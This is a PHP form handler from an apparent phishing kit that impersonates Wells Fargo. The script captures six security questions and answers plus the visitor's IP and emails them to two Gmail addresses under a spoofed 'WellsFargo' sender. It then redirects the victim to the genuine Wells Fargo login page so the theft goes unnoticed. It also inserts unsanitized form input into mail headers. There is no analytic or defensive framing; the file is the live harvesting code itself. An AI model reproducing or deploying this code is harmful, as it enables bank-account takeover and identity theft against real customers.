<?
$ip = getenv("REMOTE_ADDR");
$message .= "<<=============>>!*.*! QUESTION ANSWER !*.*!<<=============>>\n";
$message .= "QUESTION NO.1 : ".$_POST['formselect1']."\n";
$message .= "ANSWER NO.1 : ".$_POST['formtext2']."\n";
$message .= "QUESTION NO.2 : ".$_POST['formselect2']."\n";
$message .= "ANSWER NO.2 : ".$_POST['formtext3']."\n";
$message .= "QUESTION NO.3 : ".$_POST['formselect3']."\n";
$message .= "ANSWER NO.3 : ".$_POST['formtext4']."\n";
$message .= "QUESTION NO.4 : ".$_POST['formselect4']."\n";
$message .= "ANSWER NO.4 : ".$_POST['formtext5']."\n";
$message .= "QUESTION NO.5 : ".$_POST['formselect5']."\n";
$message .= "ANSWER NO.5 : ".$_POST['formtext6']."\n";
$message .= "QUESTION NO.6 : ".$_POST['formselect6']."\n";
$message .= "ANSWER NO.6 : ".$_POST['formtext7']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "bettysmith002@gmail.com, jameslucy112@gmail.com";
$subject = "WellsFargo $ip";
$headers = "From:WellsFargo<customer-support@messagemers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS");

	 
?>

